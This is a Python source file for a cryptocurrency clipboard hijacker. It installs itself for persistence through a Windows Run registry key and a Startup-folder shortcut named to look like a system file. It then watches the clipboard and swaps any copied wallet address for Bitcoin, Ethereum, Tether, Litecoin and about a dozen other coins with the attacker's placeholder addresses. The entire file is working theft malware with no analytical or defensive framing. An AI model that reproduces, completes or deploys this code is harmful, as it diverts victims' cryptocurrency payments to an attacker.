import winreg
import win32com.client
import os
import pyperclip
import re
import time

# Set the path and name of the script file
script_path = r"config.pyw"
script_name = "win10.py"

# Get the path to the Startup folder
startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")

# Create a new registry key for the script
key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, script_path)

# Create a shortcut of the script file in the Startup folder
shortcut_path = os.path.join(startup_folder, script_name + ".lnk")
shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(shortcut_path)
shortcut.Targetpath = script_path
shortcut.WorkingDirectory = os.path.dirname(script_path)
shortcut.save()

# Set the value to be replaced

ma_btc_address = "MY BTC ADDRESS"
ma_eth_address = "MY ETH ADDRES"
ma_usdt_address = "MY USDT ADDRES"
ma_ltc_address = "MY LTC ADDRESS"
ma_tron_address = "MY TRON ADDRESS"
ma_miniro_address = "MY MINIRO ADDRESS"
ma_dogecoin_address = "MY DOGECOIN ADDRESS"
ma_shiba_address = "MY SHIBA ADDRESS"
ma_cardano_address = "MY CARDANO ADDRESS"
ma_bnb_address = "MY BNB ADDRESS"
ma_atom_address = "MY ATOM ADDRESS"
ma_xlm_address = "MY XLM ADDRESS"
ma_wbtc_address = "MY WBTC ADDRESS"
ma_bch_address = "MY BCH ADDRESS"
ma_link_address = "MY LINK ADDRESS"
ma_uni_address = "MY UNI ADDRESS"



# Define regular expression patterns for BTC, ETH, and USDT addresses
btc_address_pattern = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')
eth_address_pattern = re.compile(r'^0x[a-fA-F0-9]{40}$')
usdt_address_pattern = re.compile(r'^(?:0x)?[A-Za-z0-9]{40}$')

ltc_address_pattern = re.compile(r'^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$')
tron_address_pattern = re.compile(r'^T[a-zA-Z0-9]{33}$')
miniro_address_pattern = re.compile(r'^mio[A-Za-z0-9]{39}$')
dogecoin_address_pattern = re.compile(r'^[D9][a-km-zA-HJ-NP-Z1-9]{25,34}$')
shiba_address_pattern = re.compile(r'^0x[a-fA-F0-9]{40}$')
cardano_address_pattern = re.compile(r'^addr1[A-Za-z0-9]{97}$')
bnb_address_pattern = re.compile(r'^bnb1[A-Za-z0-9]{38,98}$')
atom_address_pattern = re.compile(r'^cosmos1[A-Za-z0-9]{38}$')


xlm_address_pattern = re.compile(r'^G[A-Z0-9]{55}$')
wbtc_address_pattern = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')
bch_address_pattern = re.compile(r'^[qQpP][a-zA-Z0-9]{41}$')
link_address_pattern = re.compile(r'^0x[a-fA-F0-9]{40}$')
uni_address_pattern = re.compile(r'^0x[a-fA-F0-9]{40}$')

# Set the initial clipboard value to None
previous_value = None

# Monitor the clipboard in a loop
while True:
    # Get the current clipboard value
    current_value = pyperclip.paste()

    # Check if the clipboard value has changed
    if current_value != previous_value:
        # Check if the clipboard value is a BTC, ETH, or USDT address
        if btc_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_btc_address)
            # Print the new value 
            print(f"Pasted BTC address: {current_value} --> {ma_btc_address}")
        elif eth_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_eth_address)
            # Print the new value 
            print(f"Pasted ETH address: {current_value} --> {ma_eth_address}")
        elif usdt_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_usdt_address)
            # Print the new value 
            print(f"Pasted USDT address: {current_value} --> {ma_usdt_address}")

        elif ltc_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_ltc_address)
            # Print the new value 
            print(f"Pasted LTC address: {current_value} --> {ma_ltc_address}")

        elif tron_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_tron_address)
            # Print the new value 
            print(f"Pasted Tron address: {current_value} --> {ma_tron_address}")

        elif miniro_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_miniro_address)
            # Print the new value 
            print(f"Pasted Miniro address: {current_value} --> {ma_miniro_address}")

        elif dogecoin_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_dogecoin_address)
            # Print the new value 
            print(f"Pasted D_C address: {current_value} --> {ma_dogecoin_address}")

        elif shiba_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_shiba_address)
            # Print the new value 
            print(f"Pasted Shiba address: {current_value} --> {ma_shiba_address}")
        elif cardano_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_cardano_address)
            # Print the new value 
            print(f"Pasted Cardano address: {current_value} --> {ma_cardano_address}")
        elif bnb_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(bnb_address_pattern)
            # Print the new value 
            print(f"Pasted BNB address: {current_value} --> {bnb_address_pattern}")
        elif atom_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_atom_address)
            # Print the new value 
            print(f"Pasted ATOM address: {current_value} --> {ma_atom_address}")

        elif xlm_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_xlm_address)
            # Print the new value 
            print(f"Pasted XLM address: {current_value} --> {ma_xlm_address}")
        elif wbtc_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_wbtc_address)
            # Print the new value 
            print(f"Pasted WBTC address: {current_value} --> {ma_wbtc_address}")
        elif bch_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_bch_address)
            # Print the new value 
            print(f"Pasted BCH address: {current_value} --> {ma_bch_address}")
        elif uni_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_uni_address)
            # Print the new value 
            print(f"Pasted UNI address: {current_value} --> {ma_uni_address}")
        elif link_address_pattern.match(current_value):
            # Replace the clipboard value with the new value
            pyperclip.copy(ma_link_address)
            # Print the new value 
            print(f"Pasted LINK address: {current_value} --> {ma_link_address}")



        else:
            # Print the original value 
            print(f"Pasted value: {current_value}")

        # Set the previous value to the current value
        previous_value = current_value

    # Wait for a short time before checking again
    time.sleep(0.5)



